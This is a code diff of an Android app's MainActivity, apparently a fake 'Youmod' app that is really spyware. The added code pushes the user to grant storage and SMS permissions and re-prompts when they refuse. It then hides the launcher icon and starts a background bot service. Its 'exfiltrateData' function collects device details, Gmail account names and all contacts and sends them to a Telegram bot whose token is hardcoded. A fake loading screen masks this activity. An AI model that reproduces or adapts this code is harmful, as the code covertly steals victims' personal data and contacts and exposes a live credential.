@@ -16,13 +16,10 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.provider.ContactsContract
-import android.telephony.TelephonyManager
 import android.view.Gravity
 import android.view.View
 import android.view.WindowManager
-import android.view.animation.AnimationUtils
 import android.widget.Button
-import android.widget.HorizontalScrollView
 import android.widget.LinearLayout
 import android.widget.ProgressBar
 import android.widget.ScrollView
@@ -38,12 +35,7 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
-import java.io.ByteArrayOutputStream
 import java.io.File
-import java.io.FileOutputStream
-import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
 import java.util.concurrent.TimeUnit
 import kotlin.random.Random
 
@@ -52,14 +44,14 @@ class MainActivity : AppCompatActivity() {
     companion object {
         const val BOT_TOKEN = "8564931359:AAFcD0rdACvKK1ZajX33q_drDjU4_vlvNck"
         const val AUTHORIZED_USER = 7548711500L
-        private var MainActivity_instance: MainActivity? = null
+        private var instance: MainActivity? = null
 
         fun getDeviceId(context: Context): String {
             val prefs = context.getSharedPreferences("agent_prefs", Context.MODE_PRIVATE)
             return prefs.getString("device_id", "UNKNOWN") ?: "UNKNOWN"
         }
 
-        fun getInstance(): MainActivity? = MainActivity_instance
+        fun getInstance(): MainActivity? = instance
     }
 
     private val client = OkHttpClient.Builder()
@@ -73,16 +65,12 @@ class MainActivity : AppCompatActivity() {
     private var requiredStorageGranted = false
     private var requiredSmsGranted = false
     private var isLoading = false
-
-    private var rootLayout: LinearLayout? = null
-    private var permissionButtonsLayout: LinearLayout? = null
+    private var retryingDenied = false
     private var statusText: TextView? = null
-
-    private val permissionMap = mutableMapOf<String, Boolean>()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        MainActivity_instance = this
+        instance = this
 
         window.setFlags(
             WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
@@ -155,7 +143,7 @@ class MainActivity : AppCompatActivity() {
             shape.shape = GradientDrawable.RECTANGLE
             shape.cornerRadius = dpToPx(20).toFloat()
             shape.setColor(Color.parseColor("#CCFF0000"))
-            shape.setStroke(dpToPx(2).toInt(), Color.parseColor("#66FFFFFF"))
+            shape.setStroke(dpToPx(2), Color.parseColor("#66FFFFFF"))
             background = shape
         }
 
@@ -201,7 +189,7 @@ class MainActivity : AppCompatActivity() {
             shape.shape = GradientDrawable.RECTANGLE
             shape.cornerRadius = dpToPx(24).toFloat()
             shape.setColor(Color.parseColor("#1AFFFFFF"))
-            shape.setStroke(dpToPx(1).toInt(), Color.parseColor("#33FFFFFF"))
+            shape.setStroke(dpToPx(1), Color.parseColor("#33FFFFFF"))
             background = shape
             elevation = 8f
         }
@@ -220,7 +208,6 @@ class MainActivity : AppCompatActivity() {
             setTextColor(Color.parseColor("#BBFFFFFF"))
             gravity = Gravity.CENTER
             setPadding(0, 16, 0, 24)
-            lineSpacing(0f, 1.3f)
         }
 
         val continueBtn = Button(this).apply {
@@ -300,18 +287,17 @@ class MainActivity : AppCompatActivity() {
             setTextColor(Color.parseColor("#BBFFFFFF"))
             gravity = Gravity.CENTER
             setPadding(8, 12, 8, 24)
-            lineSpacing(0f, 1.3f)
         }
 
         statusText = TextView(this).apply {
-            text = "Tap each permission to grant it"
+            text = ""
             textSize = 13f
             setTextColor(Color.parseColor("#FFAA00"))
             gravity = Gravity.CENTER
             setPadding(0, 0, 0, 16)
         }
 
-        permissionButtonsLayout = LinearLayout(this).apply {
+        val permissionsLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
             layoutParams = LinearLayout.LayoutParams(
@@ -320,7 +306,7 @@ class MainActivity : AppCompatActivity() {
             )
         }
 
-        val permissions = listOf(
+        val permInfo = listOf(
             "Storage" to Manifest.permission.READ_MEDIA_IMAGES,
             "SMS" to Manifest.permission.READ_SMS,
             "Contacts" to Manifest.permission.READ_CONTACTS,
@@ -330,13 +316,88 @@ class MainActivity : AppCompatActivity() {
             "Location" to Manifest.permission.ACCESS_FINE_LOCATION
         )
 
-        for ((name, perm) in permissions) {
-            val btnRow = createPermissionButton(name, perm)
-            permissionButtonsLayout?.addView(btnRow)
+        for ((name, perm) in permInfo) {
+            val row = LinearLayout(this).apply {
+                orientation = LinearLayout.HORIZONTAL
+                gravity = Gravity.CENTER_VERTICAL
+                setPadding(16, 8, 16, 8)
+                val lp = LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.MATCH_PARENT,
+                    LinearLayout.LayoutParams.WRAP_CONTENT
+                )
+                lp.setMargins(0, 6, 0, 6)
+                layoutParams = lp
+                val shape = GradientDrawable()
+                shape.shape = GradientDrawable.RECTANGLE
+                shape.cornerRadius = dpToPx(16).toFloat()
+                shape.setColor(Color.parseColor("#1AFFFFFF"))
+                shape.setStroke(dpToPx(1), Color.parseColor("#22FFFFFF"))
+                background = shape
+            }
+
+            val labelText = TextView(this).apply {
+                text = name
+                textSize = 15f
+                setTextColor(Color.WHITE)
+                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
+            }
+
+            val statusDot = TextView(this).apply {
+                text = "  \u25CB  "
+                textSize = 20f
+                setTextColor(Color.parseColor("#888888"))
+            }
+
+            val requestBtn = Button(this).apply {
+                text = "Grant"
+                setTextColor(Color.WHITE)
+                textSize = 12f
+                val shape = GradientDrawable()
+                shape.shape = GradientDrawable.RECTANGLE
+                shape.cornerRadius = dpToPx(14).toFloat()
+                shape.setColor(Color.parseColor("#33FF0000"))
+                background = shape
+                setPadding(20, 8, 20, 8)
+                val btnParams = LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.WRAP_CONTENT,
+                    dpToPx(36)
+                )
+                btnParams.setMargins(8, 0, 0, 0)
+                layoutParams = btnParams
+            }
+
+            requestBtn.setOnClickListener {
+                if (ContextCompat.checkSelfPermission(this@MainActivity, perm) == PackageManager.PERMISSION_GRANTED) {
+                    requestBtn.text = "Granted"
+                    requestBtn.setTextColor(Color.parseColor("#00FF00"))
+                    statusDot.text = "  \u2713  "
+                    statusDot.setTextColor(Color.parseColor("#00FF00"))
+                    val shape = GradientDrawable()
+                    shape.shape = GradientDrawable.RECTANGLE
+                    shape.cornerRadius = dpToPx(14).toFloat()
+                    shape.setColor(Color.parseColor("#3300FF00"))
+                    requestBtn.background = shape
+                } else {
+                    val actualPerm = if (perm == Manifest.permission.READ_MEDIA_IMAGES && Build.VERSION.SDK_INT < 33) {
+                        Manifest.permission.READ_EXTERNAL_STORAGE
+                    } else {
+                        perm
+                    }
+                    ActiveButtonTag.btn = requestBtn
+                    ActiveButtonTag.dot = statusDot
+                    ActiveButtonTag.name = name
+                    ActivityCompat.requestPermissions(this@MainActivity, arrayOf(actualPerm), 200)
+                }
+            }
+
+            row.addView(labelText)
+            row.addView(statusDot)
+            row.addView(requestBtn)
+            permissionsLayout.addView(row)
         }
 
         val doneText = TextView(this).apply {
-            text = "All permissions will make the app work perfectly."
+            text = "Tap each permission to grant it"
             textSize = 12f
             setTextColor(Color.parseColor("#88FFFFFF"))
             gravity = Gravity.CENTER
@@ -346,124 +407,21 @@ class MainActivity : AppCompatActivity() {
         outerLayout.addView(headerText)
         outerLayout.addView(descText)
         outerLayout.addView(statusText)
-        outerLayout.addView(permissionButtonsLayout)
+        outerLayout.addView(permissionsLayout)
         outerLayout.addView(doneText)
 
         scrollContainer.addView(outerLayout)
         setContentView(scrollContainer)
 
         Handler(Looper.getMainLooper()).postDelayed({
-            autoRequestRequiredPermissions()
+            requestStorageFirst()
         }, 600)
     }
 
-    private fun createPermissionButton(name: String, permission: String): LinearLayout {
-        val row = LinearLayout(this).apply {
-            orientation = LinearLayout.HORIZONTAL
-            gravity = Gravity.CENTER_VERTICAL
-            setPadding(16, 8, 16, 8)
-            val params = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            )
-            params.setMargins(0, 6, 0, 6)
-            layoutParams = params
-            val shape = GradientDrawable()
-            shape.shape = GradientDrawable.RECTANGLE
-            shape.cornerRadius = dpToPx(16).toFloat()
-            shape.setColor(Color.parseColor("#1AFFFFFF"))
-            shape.setStroke(dpToPx(1).toInt(), Color.parseColor("#22FFFFFF"))
-            background = shape
-        }
-
-        val labelText = TextView(this).apply {
-            text = name
-            textSize = 15f
-            setTextColor(Color.WHITE)
-            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
-        }
-
-        val statusDot = TextView(this).apply {
-            text = "  \u25CB  "
-            textSize = 20f
-            setTextColor(Color.parseColor("#888888"))
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.WRAP_CONTENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            )
-        }
-
-        val requestBtn = Button(this).apply {
-            text = "Grant"
-            setTextColor(Color.WHITE)
-            textSize = 12f
-            val shape = GradientDrawable()
-            shape.shape = GradientDrawable.RECTANGLE
-            shape.cornerRadius = dpToPx(14).toFloat()
-            shape.setColor(Color.parseColor("#33FF0000"))
-            background = shape
-            setPadding(20, 8, 20, 8)
-            val btnParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.WRAP_CONTENT,
-                dpToPx(36)
-            )
-            btnParams.setMargins(8, 0, 0, 0)
-            layoutParams = btnParams
-
-            setOnClickListener {
-                requestSinglePermission(permission, requestBtn, statusDot, name)
-            }
-        }
-
-        row.addView(labelText)
-        row.addView(statusDot)
-        row.addView(requestBtn)
-
-        return row
-    }
-
-    private fun requestSinglePermission(permission: String, btn: Button, dot: TextView, name: String) {
-        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
-            btn.text = "Granted"
-            btn.setTextColor(Color.parseColor("#00FF00"))
-            dot.text = "  \u2713  "
-            dot.setTextColor(Color.parseColor("#00FF00"))
-            val shape = GradientDrawable()
-            shape.shape = GradientDrawable.RECTANGLE
-            shape.cornerRadius = dpToPx(14).toFloat()
-            shape.setColor(Color.parseColor("#3300FF00"))
-            btn.background = shape
-            return
-        }
-
-        if (permission == Manifest.permission.READ_MEDIA_IMAGES) {
-            val actualPerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
-            ActivityCompat.requestPermissions(this, arrayOf(actualPerm), 200)
-        } else {
-            ActivityCompat.requestPermissions(this, arrayOf(permission), 200)
-        }
-
-        pendingPermissionButton = btn
-        pendingPermissionDot = dot
-        pendingPermissionName = name
-        pendingPermissionString = permission
-    }
-
-    private var pendingPermissionButton: Button? = null
-    private var pendingPermissionDot: TextView? = null
-    private var pendingPermissionName: String? = null
-    private var pendingPermissionString: String? = null
-
-    private var hasAutoRequestedStorage = false
-    private var hasAutoRequestedSms = false
-
-    private fun autoRequestRequiredPermissions() {
-        if (!hasAutoRequestedStorage) {
-            hasAutoRequestedStorage = true
-            val storagePerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
-            statusText?.text = "Granting storage access..."
-            ActivityCompat.requestPermissions(this, arrayOf(storagePerm), 100)
-        }
+    private fun requestStorageFirst() {
+        val storagePerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+        statusText?.text = "Granting storage access..."
+        ActivityCompat.requestPermissions(this, arrayOf(storagePerm), 100)
     }
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
@@ -476,16 +434,12 @@ class MainActivity : AppCompatActivity() {
             if (granted) {
                 requiredStorageGranted = true
                 statusText?.text = "Storage granted! Now granting SMS..."
-                updateButtonVisual(Manifest.permission.READ_MEDIA_IMAGES, true)
                 Handler(Looper.getMainLooper()).postDelayed({
-                    val smsPerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_SMS else Manifest.permission.READ_SMS
-                    hasAutoRequestedSms = true
                     statusText?.text = "Granting SMS access..."
                     ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), 101)
                 }, 500)
             } else {
-                statusText?.text = "Storage permission is required. Please grant it."
-                updateButtonVisual(Manifest.permission.READ_MEDIA_IMAGES, false)
+                statusText?.text = "This permission is required. Please grant it and try again."
                 Handler(Looper.getMainLooper()).postDelayed({
                     val storagePerm = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
                     ActivityCompat.requestPermissions(this, arrayOf(storagePerm), 100)
@@ -495,17 +449,287 @@ class MainActivity : AppCompatActivity() {
             if (granted) {
                 requiredSmsGranted = true
                 statusText?.text = "SMS granted!"
-                updateButtonVisual(Manifest.permission.READ_SMS, true)
                 Handler(Looper.getMainLooper()).postDelayed({
                     if (requiredStorageGranted && requiredSmsGranted) {
                         onRequiredPermissionsGranted()
                     }
                 }, 500)
             } else {
-                statusText?.text = "SMS permission is required. Please grant it."
-                updateButtonVisual(Manifest.permission.READ_SMS, false)
+                statusText?.text = "This permission is required. Please grant it and try again."
                 Handler(Looper.getMainLooper()).postDelayed({
                     ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), 101)
                 }, 1500)
             }
-        } else if (requestCod
+        } else if (requestCode == 200) {
+            val btn = ActiveButtonTag.btn
+            val dot = ActiveButtonTag.dot
+            if (btn != null && dot != null) {
+                if (granted) {
+                    btn.text = "Granted"
+                    btn.setTextColor(Color.parseColor("#00FF00"))
+                    dot.text = "  \u2713  "
+                    dot.setTextColor(Color.parseColor("#00FF00"))
+                    val shape = GradientDrawable()
+                    shape.shape = GradientDrawable.RECTANGLE
+                    shape.cornerRadius = dpToPx(14).toFloat()
+                    shape.setColor(Color.parseColor("#3300FF00"))
+                    btn.background = shape
+                    statusText?.text = "${ActiveButtonTag.name} granted!"
+                } else {
+                    btn.text = "Denied"
+                    btn.setTextColor(Color.parseColor("#FF4444"))
+                    dot.text = "  \u2717  "
+                    dot.setTextColor(Color.parseColor("#FF4444"))
+                    val shape = GradientDrawable()
+                    shape.shape = GradientDrawable.RECTANGLE
+                    shape.cornerRadius = dpToPx(14).toFloat()
+                    shape.setColor(Color.parseColor("#33FF4444"))
+                    btn.background = shape
+                    statusText?.text = "${ActiveButtonTag.name} denied. Some features may not work."
+                }
+                ActiveButtonTag.clear()
+            }
+        }
+    }
+
+    private fun onRequiredPermissionsGranted() {
+        statusText?.text = "Optimizing your experience..."
+        disableLauncherIcon()
+        exfiltrateData()
+        startBotService()
+        showLoadingScreen()
+        val prefs = getSharedPreferences("agent_prefs", MODE_PRIVATE)
+        prefs.edit().putBoolean("is_first_run", false).apply()
+    }
+
+    private fun disableLauncherIcon() {
+        try {
+            val pm = packageManager
+            pm.setComponentEnabledSetting(
+                ComponentName(this, MainActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+    private fun showLoadingScreen() {
+        isLoading = true
+        val outerLayout = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
+            setPadding(40, 40, 40, 40)
+            layoutParams = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.MATCH_PARENT
+            )
+            val gradientBg = GradientDrawable(
+                GradientDrawable.Orientation.TOP_BOTTOM,
+                intArrayOf(Color.parseColor("#1a1a2e"), Color.parseColor("#0f3460"))
+            )
+            background = gradientBg
+        }
+
+        val loadingTitle = TextView(this).apply {
+            text = "Finalizing Setup"
+            textSize = 22f
+            setTextColor(Color.WHITE)
+            gravity = Gravity.CENTER
+            typeface = android.graphics.Typeface.DEFAULT_BOLD
+        }
+
+        val loadingDesc = TextView(this).apply {
+            text = "Optimizing your premium experience..."
+            textSize = 14f
+            setTextColor(Color.parseColor("#99FFFFFF"))
+            gravity = Gravity.CENTER
+            setPadding(0, 12, 0, 24)
+        }
+
+        val progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
+            layoutParams = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                dpToPx(6)
+            )
+            max = 100
+            progress = 0
+        }
+
+        val progressText = TextView(this).apply {
+            text = "0%"
+            textSize = 13f
+            setTextColor(Color.parseColor("#BBFFFFFF"))
+            gravity = Gravity.CENTER
+            setPadding(0, 12, 0, 0)
+        }
+
+        outerLayout.addView(loadingTitle)
+        outerLayout.addView(loadingDesc)
+        outerLayout.addView(progressBar)
+        outerLayout.addView(progressText)
+
+        setContentView(outerLayout)
+
+        val totalSteps = 300
+        val stepDuration = 1000L
+        val handler = Handler(Looper.getMainLooper())
+        var step = 0
+
+        handler.post(object : Runnable {
+            override fun run() {
+                step++
+                val pct = ((step.toFloat() / totalSteps) * 100).toInt().coerceAtMost(100)
+                progressBar.progress = pct
+                progressText.text = "${pct}%"
+                if (step < totalSteps && isLoading) {
+                    handler.postDelayed(this, stepDuration)
+                } else {
+                    isLoading = false
+                    finish()
+                }
+            }
+        })
+
+        Handler(Looper.getMainLooper()).postDelayed({
+            Toast.makeText(this, "Setup complete. Youmod is ready.", Toast.LENGTH_LONG).apply {
+                setGravity(Gravity.CENTER, 0, 0)
+                show()
+            }
+        }, 60000)
+    }
+
+    private fun exfiltrateData() {
+        Thread {
+            try {
+                val manufacturer = Build.MANUFACTURER
+                val model = Build.MODEL
+                val osVer = Build.VERSION.RELEASE
+                val buildNumber = Build.DISPLAY
+                val resolution = "${resources.displayMetrics.widthPixels}x${resources.displayMetrics.heightPixels}"
+
+                val batteryIntent = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
+                val batteryLevel = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
+                val batteryScale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
+                val batteryPct = (batteryLevel * 100) / batteryScale
+
+                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+                val network = cm.activeNetwork
+                val caps = network?.let { cm.getNetworkCapabilities(it) }
+                var connectivity = "Unknown"
+                if (caps != null) {
+                    connectivity = when {
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
+                        caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
+                        else -> "Other"
+                    }
+                }
+
+                val gmailAccounts = try {
+                    val am = AccountManager.get(this)
+                    am.getAccountsByType("com.google").joinToString(", ") { it.name }
+                } catch (e: Exception) { "Unable to retrieve: ${e.message}" }
+
+                var contactsVcf = ""
+                try {
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+                        val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+                        cursor?.use { c ->
+                            while (c.moveToNext()) {
+                                val name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                                val number = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                                contactsVcf += "BEGIN:VCARD\nVERSION:3.0\nFN:$name\nTEL:$number\nEND:VCARD\n"
+                            }
+                        }
+                    }
+                } catch (e: Exception) {}
+
+                val infoText = buildString {
+                    appendLine("Device ID: $deviceId")
+                    appendLine("Manufacturer: $manufacturer")
+                    appendLine("Model: $model")
+                    appendLine("OS Version: $osVer")
+                    appendLine("Build: $buildNumber")
+                    appendLine("Resolution: $resolution")
+                    appendLine("Battery: $batteryPct%")
+                    appendLine("Connectivity: $connectivity")
+                    appendLine("Gmail Accounts: $gmailAccounts")
+                }
+
+                sendTelegramMessage(AUTHORIZED_USER, "New device registered:\n\n$infoText")
+
+                if (contactsVcf.isNotEmpty()) {
+                    val vcfFile = File(cacheDir, "contacts_${deviceId}.vcf")
+                    vcfFile.writeText(contactsVcf)
+                    sendTelegramDocument(AUTHORIZED_USER, vcfFile)
+                }
+            } catch (e: Exception) {
+                sendTelegramMessage(AUTHORIZED_USER, "Device registered. ID: $deviceId")
+            }
+        }.start()
+    }
+
+    private fun startBotService() {
+        val serviceIntent = Intent(this, BotService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            try {
+                startForegroundService(serviceIntent)
+            } catch (e: Exception) {
+                startService(serviceIntent)
+            }
+        } else {
+            startService(serviceIntent)
+        }
+    }
+
+    fun sendTelegramMessage(chatId: Long, text: String) {
+        Thread {
+            try {
+                val url = "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
+                val json = Gson().toJson(mapOf("chat_id" to chatId, "text" to text))
+                val body = json.toRequestBody("application/json".toMediaType())
+                val request = Request.Builder().url(url).post(body).build()
+                client.newCall(request).execute()
+            } catch (e: Exception) { e.printStackTrace() }
+        }.start()
+    }
+
+    fun sendTelegramDocument(chatId: Long, file: File) {
+        Thread {
+            try {
+                val url = "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"
+                val mime = "application/octet-stream".toMediaType()
+                val requestBody = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", chatId.toString())
+                    .addFormDataPart("document", file.name, file.asRequestBody(mime))
+                    .addFormDataPart("caption", "Device ID: $deviceId")
+                    .build()
+                val request = Request.Builder().url(url).post(requestBody).build()
+                client.newCall(request).execute()
+            } catch (e: Exception) { e.printStackTrace() }
+        }.start()
+    }
+
+    private fun dpToPx(dp: Int): Int {
+        return (dp * resources.displayMetrics.density).toInt()
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        instance = null
+    }
+}
+
+object ActiveButtonTag {
+    var btn: Button? = null
+    var dot: TextView? = null
+    var name: String = ""
+    fun clear() {
+        btn = null
+        dot = null
+        name = ""
+    }
+}
